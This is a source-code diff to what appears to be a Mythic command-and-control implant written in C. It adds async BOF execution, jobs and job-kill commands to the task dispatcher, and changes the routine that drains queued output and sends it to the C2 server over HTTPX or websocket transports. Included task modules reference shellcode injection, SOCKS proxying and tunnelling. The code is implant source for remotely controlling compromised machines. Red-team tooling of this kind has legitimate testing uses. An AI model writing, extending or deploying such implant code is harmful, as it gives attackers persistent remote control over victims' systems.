@@ -15,6 +15,7 @@
 #include "Tasks/Download.h"
 #include "Tasks/Upload.h"
 #include "Tasks/InlineExecute.h"
+#include "Tasks/AsyncBof.h"
 #include "Tasks/InjectShellcode.h"
 #include "Tasks/Socks.h"
 #include "Tasks/Tunnel.h"
@@ -218,6 +219,30 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_ASYNC_EXECUTE
+        case ASYNC_EXECUTE_CMD:
+        {
+            _dbg("ASYNC_EXECUTE_CMD was called");
+            AsyncExecute(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JOBKILL
+        case JOBKILL_CMD:
+        {
+            _dbg("JOBKILL_CMD was called");
+            AsyncBofJobKill(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JOBS
+        case JOBS_CMD:
+        {
+            _dbg("JOBS_CMD was called");
+            AsyncBofJobs(taskUuid, taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_SPAWNTO
         case SPAWNTO_CMD:
         {
@@ -375,8 +400,14 @@ VOID TaskProcess(PPARSER tasks)
  */
 VOID TaskRoutine()
 {
-    /* Send Msgs in the Queue */
+    /* Drain async BOF messages before sending all */
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    AsyncBofPush();
+#endif
+    
 
+    /* Now lets send all messages in the queue depending on the
+     transport type and process responses */
     PARSER Output = { 0 };
 
 #ifdef HTTPX_TRANSPORT
@@ -489,7 +520,6 @@ VOID TaskRoutine()
 #endif
 
     /* Handle all those responses */
-
 #ifdef WEBSOCKET_TRANSPORT
     /* TaskProcess already ran for each inbound frame above */
 #else
@@ -531,27 +561,26 @@ VOID TaskRoutine()
 
 #endif
 
+
 #ifdef WEBSOCKET_TRANSPORT
 
-    /*
-     * Flush anything TaskProcess / SocksPush / etc. just queued.
-     * Without this, responses sit until the next inbound wake-up.
-     */
+    /* Flush anything TaskProcess / SocksPush / etc. just queued.
+     Without this, responses sit until the next inbound wake-up. */
     PackageSendAll(NULL);
 
-#endif
+#else
+
+#endif  // #ifdef WEBSOCKET_TRANSPORT
 
 
 CLEANUP:
 
 #ifdef WEBSOCKET_TRANSPORT
 
-    /*
-     * True Push idle: block until Mythic pushes a frame.
-     * When local tunnels/downloads need servicing, use a short wait so
-     * SocksPush/RportfwdPush/DownloadPush keep ticking without C2 polls.
-     * If disconnected, never INFINITE-wait (nothing will signal).
-     */
+    /* True Push idle: block until Mythic pushes a frame.
+     When local tunnels/downloads need servicing, use a short wait so
+     SocksPush/RportfwdPush/DownloadPush keep ticking without C2 polls.
+     If disconnected, never INFINITE-wait (nothing will signal). */
     if ( !WebsocketIsConnected() )
         return;
     else if ( WebsocketNeedsLocalPump() )
